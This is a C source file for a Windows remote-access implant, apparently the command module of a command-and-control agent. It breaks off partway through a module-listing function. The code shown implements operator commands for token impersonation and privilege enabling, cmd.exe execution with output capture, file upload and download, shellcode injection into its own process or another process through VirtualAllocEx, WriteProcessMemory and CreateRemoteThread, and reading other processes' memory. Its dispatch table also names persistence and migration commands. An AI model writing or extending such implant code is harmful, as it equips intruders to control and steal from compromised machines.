#include <stdio.h>

#include "command.h"
#include "exports.h"

/* ---------------------------------------------------------------------------
 * NT handle-enumeration types (private — avoids winternl.h conflicts)
 * ------------------------------------------------------------------------- */

typedef LONG (NTAPI *PFN_NtQSI)(ULONG, PVOID, ULONG, PULONG);

#define MY_STATUS_INFO_MISMATCH  0xC0000004L
#define MY_SYS_HANDLE_INFO_CLASS 16U

#pragma pack(push, 1)
typedef struct {
    USHORT OwnerPid;
    USHORT CreatorBackTraceIdx;
    UCHAR  ObjectTypeIdx;
    UCHAR  HandleAttr;
    USHORT HandleValue;
    PVOID  ObjectPtr;
    ULONG  GrantedAccess;
} SHANDLE_ENTRY;

typedef struct {
    ULONG        EntryCount;
    SHANDLE_ENTRY Entries[1];
} SHANDLE_INFO;
#pragma pack(pop)

/* ---------------------------------------------------------------------------
 * Command dispatch table
 * ------------------------------------------------------------------------- */

CONST COMMAND_MAP G_CommandTable[] = {
    { CMD_INSPECT_TOKEN,    CmdInspectToken    },
    { CMD_IMPERSONATE_TOKEN, CmdImpersonateToken },
    { CMD_ENABLE_PRIVILEGE,  CmdEnablePrivilege  },
    { CMD_DISABLE_PRIVILEGE, CmdDisablePrivilege },
    { CMD_HOSTNAME,          CmdHostname         },
    { CMD_WHOAMI,            CmdWhoami           },
    { CMD_LS,                CmdLs               },
    { CMD_CAT,               CmdCat              },
    { CMD_MKDIR,             CmdMkdir            },
    { CMD_RM,                CmdRm               },
    { CMD_UPLOAD,            CmdUpload           },
    { CMD_DOWNLOAD,          CmdDownload         },
    { CMD_PS,                CmdPs               },
    { CMD_GETPID,            CmdGetpid           },
    { CMD_EXEC,              CmdExec             },
    { CMD_SHELLCODEEXEC,     CmdShellcodeexec    },
    { CMD_MEMREAD,           CmdMemread          },
    { CMD_MODULELIST,        CmdModulelist       },
    { CMD_HANDLELIST,        CmdHandlelist       },
    { CMD_ENV,               CmdEnv              },
    { CMD_GETENV,            CmdGetenv           },
    { CMD_SETENV,            CmdSetenv           },
    { CMD_SLEEP,             CmdSleep            },
    { CMD_KILL,              CmdKill             },
    { CMD_PERSIST,           CmdPersist          },
    { CMD_UNPERSIST,         CmdUnpersist        },
    { CMD_MIGRATE,           CmdMigrate          },
};

/* ---------------------------------------------------------------------------
 * Internal helpers
 * ------------------------------------------------------------------------- */

#define UTF8_WIDE_NULL_TERMINATOR_COUNT 1U

static DWORD ConvertUtf8ToWideString(
    DWORD dataLen,
    CONST PBYTE data,
    PWSTR* wideString
)
{
    INT wideCharCount = 0;
    PWSTR buffer = NULL;

    ASSERT(wideString != NULL);

    *wideString = NULL;
    if (data == NULL || dataLen == 0)
        return ERROR_INVALID_REQUEST;

    wideCharCount = MultiByteToWideChar(CP_UTF8, 0, (LPCCH)data, (INT)dataLen, NULL, 0);
    if (wideCharCount <= 0)
        return ERROR_INVALID_REQUEST;

    buffer = (PWSTR)ImplantHeapAlloc(
        ((SIZE_T)wideCharCount + UTF8_WIDE_NULL_TERMINATOR_COUNT) * sizeof(WCHAR));
    if (buffer == NULL)
        return ERROR_MEMORY_ALLOCATION_FAILED;

    if (MultiByteToWideChar(CP_UTF8, 0, (LPCCH)data, (INT)dataLen, buffer, wideCharCount) <= 0)
    {
        ImplantHeapFree(buffer);
        return ERROR_INVALID_REQUEST;
    }

    buffer[wideCharCount] = L'\0';
    *wideString = buffer;
    return NO_ERROR;
}

/* ---------------------------------------------------------------------------
 * Token commands (unchanged from original implementation)
 * ------------------------------------------------------------------------- */

DWORD CmdInspectToken(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    UNREFERENCED_PARAMETER(dataLen);
    UNREFERENCED_PARAMETER(data);
    return BuildCurrentTokenSummaryResponse(responseData, responseLen);
}

DWORD CmdImpersonateToken(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    DWORD processId = 0;
    DWORD status    = NO_ERROR;

    if (dataLen < sizeof(DWORD) || data == NULL)
        return ERROR_INVALID_REQUEST;

    processId = *(DWORD*)data;
    if (processId == 0 || processId % 4 != 0)
        return ERROR_INVALID_PID;

    status = ImpersonateProcessToken(processId);
    if (status == NO_ERROR)
        status = BuildTokenImpersonationResponseFromToken(processId, responseData, responseLen);

    return status;
}

DWORD CmdEnablePrivilege(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    DWORD  status        = NO_ERROR;
    PWSTR  privilegeName = NULL;

    status = ConvertUtf8ToWideString(dataLen, data, &privilegeName);
    if (status != NO_ERROR) return status;

    if (IsPrivilegeEnabled(privilegeName))
    {
        status = BuildTokenEnablePrivilegeResponseFromToken(privilegeName,
            PRIV_ENABLE_SUCCESS, PRIV_ENABLED_PREVIOUSLY, responseData, responseLen);
    }
    else
    {
        status = EnableCurrentTokenPrivilege(privilegeName);
        if (status == ERROR_INVALID_PRIVILEGE)
            goto cleanup;

        if (status == NO_ERROR)
            status = BuildTokenEnablePrivilegeResponseFromToken(privilegeName,
                PRIV_ENABLE_SUCCESS, PRIV_DISABLED_PREVIOUSLY, responseData, responseLen);
        else
            status = BuildTokenEnablePrivilegeResponseFromToken(privilegeName,
                status, PRIV_DISABLED_PREVIOUSLY, responseData, responseLen);
    }

cleanup:
    ImplantHeapFree(privilegeName);
    return status;
}

DWORD CmdDisablePrivilege(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    DWORD status    = NO_ERROR;
    PWSTR privName  = NULL;
    DWORD prevStatus = PRIV_DISABLED_PREVIOUSLY;

    status = ConvertUtf8ToWideString(dataLen, data, &privName);
    if (status != NO_ERROR) goto cleanup;

    if (IsPrivilegeEnabled(privName))
        prevStatus = PRIV_ENABLED_PREVIOUSLY;

    status = DisableCurrentTokenPrivilege(privName);
    if (status == NO_ERROR)
        status = BuildTokenEnablePrivilegeResponseFromToken(
            privName, PRIV_DISABLE_SUCCESS, prevStatus, responseData, responseLen);
    else
        status = BuildTokenEnablePrivilegeResponseFromToken(
            privName, status, prevStatus, responseData, responseLen);

cleanup:
    if (privName) ImplantHeapFree(privName);
    return status;
}

DWORD CmdHostname(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    UNREFERENCED_PARAMETER(dataLen);
    UNREFERENCED_PARAMETER(data);

    DWORD   status  = NO_ERROR;
    AllSI_t sysInfo = GetAllSystemInformation();

    if (!sysInfo.computerName) { status = ERROR_MEMORY_ALLOCATION_FAILED; goto cleanup; }

    DWORD compBytes = (DWORD)(wcslen(sysInfo.computerName) + 1) * sizeof(WCHAR);
    PBYTE buf       = (PBYTE)ImplantHeapAlloc(compBytes);
    if (!buf) { status = ERROR_MEMORY_ALLOCATION_FAILED; goto cleanup; }

    CopyMemory(buf, sysInfo.computerName, compBytes);
    *responseData = buf;
    *responseLen  = compBytes;

cleanup:
    if (sysInfo.computerName) ImplantHeapFree(sysInfo.computerName);
    if (sysInfo.userName)     ImplantHeapFree(sysInfo.userName);
    if (sysInfo.architecture) ImplantHeapFree(sysInfo.architecture);
    return status;
}

DWORD CmdWhoami(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    UNREFERENCED_PARAMETER(dataLen);
    UNREFERENCED_PARAMETER(data);

    DWORD   status  = NO_ERROR;
    AllSI_t sysInfo = GetAllSystemInformation();

    if (!sysInfo.userName) { status = ERROR_MEMORY_ALLOCATION_FAILED; goto cleanup; }

    DWORD userBytes  = (DWORD)(wcslen(sysInfo.userName) + 1) * sizeof(WCHAR);
    DWORD totalLen   = sizeof(DWORD) + userBytes;
    PBYTE buf        = (PBYTE)ImplantHeapAlloc(totalLen);
    if (!buf) { status = ERROR_MEMORY_ALLOCATION_FAILED; goto cleanup; }

    *(DWORD*)buf = (DWORD)sysInfo.admin;
    CopyMemory(buf + sizeof(DWORD), sysInfo.userName, userBytes);

    *responseData = buf;
    *responseLen  = totalLen;

cleanup:
    if (sysInfo.computerName) ImplantHeapFree(sysInfo.computerName);
    if (sysInfo.userName)     ImplantHeapFree(sysInfo.userName);
    if (sysInfo.architecture) ImplantHeapFree(sysInfo.architecture);
    return status;
}

/* ===========================================================================
 * FILESYSTEM COMMANDS
 * ========================================================================= */

/*
 * CmdLs — list directory contents.
 *
 * Response: DWORD count
 *           for each entry:
 *             DWORD  type        (0=file 1=directory)
 *             UINT64 size        (bytes)
 *             DWORD  name_bytes  (byte length of the UTF-16LE name incl. null)
 *             WCHAR  name[]
 */
DWORD CmdLs(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    PWSTR          path       = NULL;
    PWSTR          srchPath   = NULL;
    DWORD          pathChars;
    DWORD          status     = NO_ERROR;
    HANDLE         hFind      = INVALID_HANDLE_VALUE;
    WIN32_FIND_DATAW fd;
    PBYTE          buf        = NULL;
    DWORD          bufCap     = 65536U;
    DWORD          offset;
    DWORD          count;

    status = ConvertUtf8ToWideString(dataLen, data, &path);
    if (status != NO_ERROR) return status;

    pathChars = (DWORD)(wcslen(path) + 3U);   /* "path\\*\0" */
    srchPath  = (PWSTR)ImplantHeapAlloc(pathChars * sizeof(WCHAR));
    if (!srchPath) { ImplantHeapFree(path); return ERROR_MEMORY_ALLOCATION_FAILED; }

    wcscpy_s(srchPath, pathChars, path);
    wcscat_s(srchPath, pathChars, L"\\*");
    ImplantHeapFree(path); path = NULL;

    buf = (PBYTE)ImplantHeapAlloc(bufCap);
    if (!buf) { ImplantHeapFree(srchPath); return ERROR_MEMORY_ALLOCATION_FAILED; }

    hFind = FindFirstFileW(srchPath, &fd);
    ImplantHeapFree(srchPath);

    if (hFind == INVALID_HANDLE_VALUE)
    {
        ImplantHeapFree(buf);
        return GetLastError();
    }

    offset = sizeof(DWORD);   /* reserve for count */
    count  = 0;

    do
    {
        DWORD  type;
        UINT64 sz;
        DWORD  nameBytes;
        DWORD  entrySize;

        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0)
            continue;

        nameBytes = (DWORD)((wcslen(fd.cFileName) + 1U) * sizeof(WCHAR));
        entrySize = sizeof(DWORD) + sizeof(UINT64) + sizeof(DWORD) + nameBytes;

        if (offset + entrySize > bufCap) break;   /* truncate on overflow */

        type = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 1U : 0U;
        sz   = ((UINT64)fd.nFileSizeHigh << 32) | (UINT64)fd.nFileSizeLow;

        *(DWORD*) (buf + offset) = type;      offset += sizeof(DWORD);
        *(UINT64*)(buf + offset) = sz;        offset += sizeof(UINT64);
        *(DWORD*) (buf + offset) = nameBytes; offset += sizeof(DWORD);
        CopyMemory(buf + offset, fd.cFileName, nameBytes);
        offset += nameBytes;
        count++;
    }
    while (FindNextFileW(hFind, &fd));

    FindClose(hFind);

    *(DWORD*)buf = count;
    *responseData = buf;
    *responseLen  = offset;
    return NO_ERROR;
}

/*
 * CmdCat — read and return a file's raw bytes.
 */
DWORD CmdCat(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    PWSTR  path     = NULL;
    HANDLE hFile    = INVALID_HANDLE_VALUE;
    DWORD  fileSize;
    PBYTE  fileBuf  = NULL;
    DWORD  bytesRead;
    DWORD  status   = NO_ERROR;

    status = ConvertUtf8ToWideString(dataLen, data, &path);
    if (status != NO_ERROR) return status;

    hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    ImplantHeapFree(path);

    if (hFile == INVALID_HANDLE_VALUE) return GetLastError();

    fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE)
    {
        status = GetLastError();
        CloseHandle(hFile);
        return status;
    }

    if (fileSize == 0)
    {
        /* Return empty but valid response. */
        CloseHandle(hFile);
        *responseData = NULL;
        *responseLen  = 0;
        return NO_ERROR;
    }

    fileBuf = (PBYTE)ImplantHeapAlloc(fileSize);
    if (!fileBuf) { CloseHandle(hFile); return ERROR_MEMORY_ALLOCATION_FAILED; }

    if (!ReadFile(hFile, fileBuf, fileSize, &bytesRead, NULL) || bytesRead != fileSize)
    {
        status = GetLastError();
        ImplantHeapFree(fileBuf);
        CloseHandle(hFile);
        return status;
    }

    CloseHandle(hFile);
    *responseData = fileBuf;
    *responseLen  = fileSize;
    return NO_ERROR;
}

/*
 * CmdMkdir — create a directory.
 */
DWORD CmdMkdir(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    PWSTR path   = NULL;
    DWORD status = NO_ERROR;

    UNREFERENCED_PARAMETER(responseData);
    UNREFERENCED_PARAMETER(responseLen);

    status = ConvertUtf8ToWideString(dataLen, data, &path);
    if (status != NO_ERROR) return status;

    if (!CreateDirectoryW(path, NULL))
        status = GetLastError();

    ImplantHeapFree(path);
    return status;
}

/*
 * CmdRm — delete a file or (empty) directory.
 */
DWORD CmdRm(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    PWSTR path   = NULL;
    DWORD status = NO_ERROR;
    DWORD attrs;

    UNREFERENCED_PARAMETER(responseData);
    UNREFERENCED_PARAMETER(responseLen);

    status = ConvertUtf8ToWideString(dataLen, data, &path);
    if (status != NO_ERROR) return status;

    attrs = GetFileAttributesW(path);
    if (attrs == INVALID_FILE_ATTRIBUTES)
    {
        status = GetLastError();
    }
    else if (attrs & FILE_ATTRIBUTE_DIRECTORY)
    {
        if (!RemoveDirectoryW(path)) status = GetLastError();
    }
    else
    {
        if (!DeleteFileW(path)) status = GetLastError();
    }

    ImplantHeapFree(path);
    return status;
}

/*
 * CmdUpload — write a file sent by the operator to disk.
 *
 * Argument layout:
 *   DWORD  path_utf8_len
 *   BYTE   path_utf8[path_utf8_len]
 *   BYTE   file_data[remainder]
 */
DWORD CmdUpload(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    DWORD        pathLen;
    PWSTR        path         = NULL;
    HANDLE       hFile        = INVALID_HANDLE_VALUE;
    DWORD        fileDataLen;
    DWORD        bytesWritten;
    DWORD        status       = NO_ERROR;
    const BYTE*  fileData     = NULL;

    UNREFERENCED_PARAMETER(responseData);
    UNREFERENCED_PARAMETER(responseLen);

    if (dataLen < sizeof(DWORD) || !data) return ERROR_INVALID_REQUEST;

    pathLen = *(DWORD*)data;
    if (dataLen < sizeof(DWORD) + pathLen) return ERROR_INVALID_REQUEST;

    /* Initialize after pathLen is known — avoids const-without-initializer. */
    fileData    = data + sizeof(DWORD) + pathLen;
    fileDataLen = dataLen - sizeof(DWORD) - pathLen;

    status = ConvertUtf8ToWideString(pathLen, data + sizeof(DWORD), &path);
    if (status != NO_ERROR) return status;

    hFile = CreateFileW(path, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    ImplantHeapFree(path);

    if (hFile == INVALID_HANDLE_VALUE) return GetLastError();

    if (fileDataLen > 0)
    {
        if (!WriteFile(hFile, fileData, fileDataLen, &bytesWritten, NULL) ||
            bytesWritten != fileDataLen)
        {
            status = GetLastError();
        }
    }

    CloseHandle(hFile);
    return status;
}

/*
 * CmdDownload — read a file from disk and return it to the operator.
 *
 * Response layout:
 *   DWORD  name_bytes              (byte length of UTF-16LE basename incl. null)
 *   WCHAR  basename[name_bytes/2]
 *   BYTE   file_data[remainder]
 */
DWORD CmdDownload(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    PWSTR  path      = NULL;
    HANDLE hFile     = INVALID_HANDLE_VALUE;
    DWORD  fileSize;
    DWORD  bytesRead;
    PWSTR  baseName;
    DWORD  nameBytes;
    DWORD  totalLen;
    PBYTE  resp      = NULL;
    DWORD  status    = NO_ERROR;

    status = ConvertUtf8ToWideString(dataLen, data, &path);
    if (status != NO_ERROR) return status;

    hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        status = GetLastError();
        ImplantHeapFree(path);
        return status;
    }

    fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE)
    {
        status = GetLastError();
        CloseHandle(hFile);
        ImplantHeapFree(path);
        return status;
    }

    /* Extract just the filename component. */
    baseName = wcsrchr(path, L'\\');
    baseName = baseName ? baseName + 1 : path;
    nameBytes = (DWORD)((wcslen(baseName) + 1U) * sizeof(WCHAR));

    totalLen = sizeof(DWORD) + nameBytes + fileSize;
    resp = (PBYTE)ImplantHeapAlloc(totalLen);
    if (!resp)
    {
        CloseHandle(hFile);
        ImplantHeapFree(path);
        return ERROR_MEMORY_ALLOCATION_FAILED;
    }

    *(DWORD*)resp = nameBytes;
    CopyMemory(resp + sizeof(DWORD), baseName, nameBytes);
    ImplantHeapFree(path); path = NULL;

    if (fileSize > 0)
    {
        if (!ReadFile(hFile, resp + sizeof(DWORD) + nameBytes, fileSize, &bytesRead, NULL) ||
            bytesRead != fileSize)
        {
            status = GetLastError();
            ImplantHeapFree(resp);
            CloseHandle(hFile);
            return status;
        }
    }

    CloseHandle(hFile);
    *responseData = resp;
    *responseLen  = totalLen;
    return NO_ERROR;
}

/* ===========================================================================
 * SYSTEM ENUMERATION COMMANDS
 * ========================================================================= */

/*
 * CmdPs — enumerate running processes.
 *
 * Response: DWORD count
 *           for each entry:
 *             DWORD  pid
 *             DWORD  name_bytes  (UTF-16LE incl. null)
 *             WCHAR  name[]
 */
DWORD CmdPs(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    ProcessInfo_t psInfo;
    PBYTE         buf      = NULL;
    DWORD         bufCap   = 65536U;
    DWORD         offset;
    DWORD         count;
    DWORD         i;

    UNREFERENCED_PARAMETER(dataLen);
    UNREFERENCED_PARAMETER(data);

    psInfo = GetProcessInfo();
    if (!psInfo.processArray) return ERROR_MEMORY_ALLOCATION_FAILED;

    buf = (PBYTE)ImplantHeapAlloc(bufCap);
    if (!buf) { ImplantHeapFree(psInfo.processArray); return ERROR_MEMORY_ALLOCATION_FAILED; }

    offset = sizeof(DWORD);   /* reserve for count */
    count  = 0;

    for (i = 0; i < psInfo.numProcesses; i++)
    {
        DWORD  pid       = psInfo.processArray[i];
        WCHAR* pname     = GetProcessName(pid);
        DWORD  nameBytes;
        DWORD  entrySize;

        if (!pname) continue;

        nameBytes = (DWORD)((wcslen(pname) + 1U) * sizeof(WCHAR));
        entrySize = sizeof(DWORD) + sizeof(DWORD) + nameBytes;

        if (offset + entrySize > bufCap)
        {
            ImplantHeapFree(pname);
            break;
        }

        *(DWORD*)(buf + offset) = pid;       offset += sizeof(DWORD);
        *(DWORD*)(buf + offset) = nameBytes; offset += sizeof(DWORD);
        CopyMemory(buf + offset, pname, nameBytes);
        offset += nameBytes;
        ImplantHeapFree(pname);
        count++;
    }

    ImplantHeapFree(psInfo.processArray);

    *(DWORD*)buf = count;
    *responseData = buf;
    *responseLen  = offset;
    return NO_ERROR;
}

/*
 * CmdGetpid — return the implant's own PID.
 */
DWORD CmdGetpid(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    PBYTE resp;

    UNREFERENCED_PARAMETER(dataLen);
    UNREFERENCED_PARAMETER(data);

    resp = (PBYTE)ImplantHeapAlloc(sizeof(DWORD));
    if (!resp) return ERROR_MEMORY_ALLOCATION_FAILED;

    *(DWORD*)resp = GetCurrentProcessId();
    *responseData = resp;
    *responseLen  = sizeof(DWORD);
    return NO_ERROR;
}

/* ===========================================================================
 * EXECUTION COMMANDS
 * ========================================================================= */

/*
 * CmdExec — run a shell command and capture stdout+stderr.
 *
 * Response: DWORD exit_code
 *           DWORD output_bytes
 *           BYTE  output[]        (raw bytes from cmd.exe pipe)
 */
DWORD CmdExec(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    PWSTR              command    = NULL;
    PWSTR              cmdLine    = NULL;
    HANDLE             hRead      = NULL;
    HANDLE             hWrite     = NULL;
    SECURITY_ATTRIBUTES sa;
    STARTUPINFOW       si;
    PROCESS_INFORMATION pi;
    PBYTE              outBuf     = NULL;
    DWORD              outCap     = 65536U;
    DWORD              outLen     = 0;
    DWORD              bytesRead;
    DWORD              exitCode   = 0;
    PBYTE              resp       = NULL;
    DWORD              totalLen;
    DWORD              status     = NO_ERROR;
    BOOL               created    = FALSE;
    SIZE_T             cmdLen;

    status = ConvertUtf8ToWideString(dataLen, data, &command);
    if (status != NO_ERROR) return status;

    ZeroMemory(&sa, sizeof(sa));
    sa.nLength        = sizeof(sa);
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
    {
        ImplantHeapFree(command);
        return GetLastError();
    }

    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    ZeroMemory(&si, sizeof(si));
    si.cb         = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;
    si.hStdInput  = NULL;

    /* Build "cmd.exe /c <command>" */
    cmdLen  = wcslen(command) + 14U;
    cmdLine = (PWSTR)ImplantHeapAlloc(cmdLen * sizeof(WCHAR));
    if (!cmdLine)
    {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        ImplantHeapFree(command);
        return ERROR_MEMORY_ALLOCATION_FAILED;
    }

    wcscpy_s(cmdLine, cmdLen, L"cmd.exe /c ");
    wcscat_s(cmdLine, cmdLen, command);
    ImplantHeapFree(command); command = NULL;

    ZeroMemory(&pi, sizeof(pi));
    created = CreateProcessW(NULL, cmdLine, NULL, NULL, TRUE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    ImplantHeapFree(cmdLine);
    CloseHandle(hWrite); hWrite = NULL;

    if (!created)
    {
        CloseHandle(hRead);
        return GetLastError();
    }

    outBuf = (PBYTE)ImplantHeapAlloc(outCap);
    if (!outBuf)
    {
        CloseHandle(hRead);
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return ERROR_MEMORY_ALLOCATION_FAILED;
    }

    for (;;)
    {
        DWORD remaining = outCap - outLen;
        if (remaining == 0) break;
        if (!ReadFile(hRead, outBuf + outLen, remaining, &bytesRead, NULL)) break;
        if (bytesRead == 0) break;
        outLen += bytesRead;
    }
    CloseHandle(hRead);

    WaitForSingleObject(pi.hProcess, 10000);
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    totalLen = sizeof(DWORD) + sizeof(DWORD) + outLen;
    resp     = (PBYTE)ImplantHeapAlloc(totalLen);
    if (!resp)
    {
        ImplantHeapFree(outBuf);
        return ERROR_MEMORY_ALLOCATION_FAILED;
    }

    *(DWORD*)resp                       = exitCode;
    *(DWORD*)(resp + sizeof(DWORD))     = outLen;
    if (outLen > 0) CopyMemory(resp + sizeof(DWORD) * 2, outBuf, outLen);

    ImplantHeapFree(outBuf);
    *responseData = resp;
    *responseLen  = totalLen;
    return NO_ERROR;
}

/*
 * CmdShellcodeexec — inject and run raw shellcode.
 *
 * Argument layout:
 *   DWORD  target_pid   (0 = self)
 *   BYTE   shellcode[]
 */
DWORD CmdShellcodeexec(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    DWORD        targetPid;
    const BYTE*  shellcode   = NULL;   /* assigned after guard; non-const ptr avoids C4132 */
    DWORD        shellcodeLen;
    LPVOID       mem         = NULL;
    DWORD        status      = NO_ERROR;

    UNREFERENCED_PARAMETER(responseData);
    UNREFERENCED_PARAMETER(responseLen);

    if (dataLen < sizeof(DWORD) + 1U || !data) return ERROR_INVALID_REQUEST;

    targetPid    = *(DWORD*)data;
    shellcode    = data + sizeof(DWORD);
    shellcodeLen = dataLen - sizeof(DWORD);

    if (targetPid == 0)
    {
        /* Self-injection */
        LPTHREAD_START_ROUTINE entry;
        HANDLE hThread;

        mem = VirtualAlloc(NULL, shellcodeLen,
                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!mem) return GetLastError();

        CopyMemory(mem, shellcode, shellcodeLen);

#pragma warning(push)
#pragma warning(disable: 4055)
        entry = (LPTHREAD_START_ROUTINE)mem;
#pragma warning(pop)
        hThread = CreateThread(NULL, 0, entry, NULL, 0, NULL);
        if (!hThread)
        {
            status = GetLastError();
            VirtualFree(mem, 0, MEM_RELEASE);
        }
        else
        {
            CloseHandle(hThread);
        }
    }
    else
    {
        /* Remote injection */
        HANDLE hProcess;
        SIZE_T written;
        LPTHREAD_START_ROUTINE entry;
        HANDLE hThread;

        hProcess = OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
            FALSE, targetPid);
        if (!hProcess) return GetLastError();

        mem = VirtualAllocEx(hProcess, NULL, shellcodeLen,
                             MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!mem)
        {
            status = GetLastError();
            CloseHandle(hProcess);
            return status;
        }

        if (!WriteProcessMemory(hProcess, mem, shellcode, shellcodeLen, &written))
        {
            status = GetLastError();
            VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return status;
        }

#pragma warning(push)
#pragma warning(disable: 4055)
        entry = (LPTHREAD_START_ROUTINE)mem;
#pragma warning(pop)
        hThread = CreateRemoteThread(hProcess, NULL, 0, entry, NULL, 0, NULL);
        if (!hThread)
        {
            status = GetLastError();
            VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
        }
        else
        {
            CloseHandle(hThread);
        }
        CloseHandle(hProcess);
    }

    return status;
}

/* ===========================================================================
 * MEMORY / OBJECT INSPECTION COMMANDS
 * ========================================================================= */

/*
 * CmdMemread — read bytes from another process's address space.
 *
 * Argument layout:
 *   DWORD   pid
 *   UINT64  address
 *   DWORD   size
 */
DWORD CmdMemread(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    DWORD   targetPid;
    UINT64  address;
    DWORD   readSize;
    HANDLE  hProcess;
    PBYTE   buf;
    SIZE_T  bytesRead;
    DWORD   status = NO_ERROR;

    if (dataLen < sizeof(DWORD) + sizeof(UINT64) + sizeof(DWORD) || !data)
        return ERROR_INVALID_REQUEST;

    targetPid = *(DWORD*)  data;
    address   = *(UINT64*)(data + sizeof(DWORD));
    readSize  = *(DWORD*) (data + sizeof(DWORD) + sizeof(UINT64));

    if (readSize == 0) return ERROR_INVALID_REQUEST;

    buf = (PBYTE)ImplantHeapAlloc(readSize);
    if (!buf) return ERROR_MEMORY_ALLOCATION_FAILED;

    hProcess = OpenProcess(PROCESS_VM_READ, FALSE, targetPid);
    if (!hProcess)
    {
        ImplantHeapFree(buf);
        return GetLastError();
    }

    if (!ReadProcessMemory(hProcess, (LPCVOID)(ULONG_PTR)address, buf, readSize, &bytesRead))
    {
        status = GetLastError();
        ImplantHeapFree(buf);
        CloseHandle(hProcess);
        return status;
    }

    CloseHandle(hProcess);
    *responseData = buf;
    *responseLen  = (DWORD)bytesRead;
    return NO_ERROR;
}

/*
 * CmdModulelist — list modules loaded in a process.
 *
 * Response: DWORD  count
 *           for each module:
 *             UINT64 base_address
 *             DWORD  name_bytes   (UTF-16LE incl. null)
 *             WCHAR  name[]
 */
DWORD CmdModulelist(
    DWORD dataLen, CONST PBYTE data,
    PBYTE* responseData, DWORD* responseLen)
{
    DWORD        pid;
    DWORD        cbNeeded    = 0;
    ModuleInfo_t* modules    = NULL;
    DWORD        moduleCount;
    DWORD        bufCap;
    PBYTE        buf         = NULL;
    DWORD        offset;
    DWORD        actualCount;
    DWORD        i;

    if (dataLen < sizeof(DWORD) || !data) return ERROR_INVALID_REQUEST;
    pid = *(DWORD*)data;

    modules = GetModules(pid, &cbNeeded);
    if (!modules) return GetLastError() ? GetLastError() : ERROR_OPEN_PROCESS_TOKEN_FAILED;

    moduleCount = cbNeeded;   /* GetModules sets cbNeeded to actual module count */

    bufCap = sizeof(DWORD) +
             moduleCount * (sizeof(UINT64) + sizeof(DWORD) + MAX_PATH * sizeof(WCHAR));

    buf = (PBYTE)ImplantHeapAlloc(bufCap);
    if (!buf)
    {
        for (i = 0; i < moduleCount; i++)
        {
            if (modules[i].name) ImplantHeapFree(modules[i].name);
            if (modules[i].path) ImplantHeapFree(modules[i].path);
        }
        ImplantHeapFree(modules);
        return ERROR_MEMORY_ALLOCATION_FAILED;
    }

    offset      = sizeof(DWORD);
    actualCount = 0;

    for (i = 0; i < moduleCount; i++)
    {
        PCWSTR  name;
        DWORD   nameBytes;
        UINT64  base;
        DWORD   entrySize;

        name      = (modules[i].name && modules[i].name[0]) ? modules[i].name : L"<unknown>";
        nameBytes = (DWORD)((wcslen(name) + 1U) * sizeof(WCHAR));
        base      = (UINT64)(ULONG_PTR)modules[i].baseAddress;
        entrySize = sizeof(UINT64) + sizeof(DWORD) + nameBytes;

        if (offset + entrySize > bufCap)
        {
            if (modules[i].name) ImplantHeapFree(modules[i].name);
            if (modules[i].path) ImplantHeapFree(modules[i].path);
            break;
        }

        *(UINT64*)(buf + offset) = base;      offset += sizeof(UINT64);
        *(DWORD*) (buf + offset) = nameBytes; offset += sizeof(DWORD);
        CopyMemory(buf + offset, name, nameBytes);
        offset += nameBytes;
        actualCount++;

        if (modules[i].name) ImplantHeapFree(modules[i].name);
        if (modules[i].path) ImplantHeapFree(modules[i].path);
    }

    /* Free any remaining entries that didn't fit. */
    for (; i < moduleCount; i++)
    {
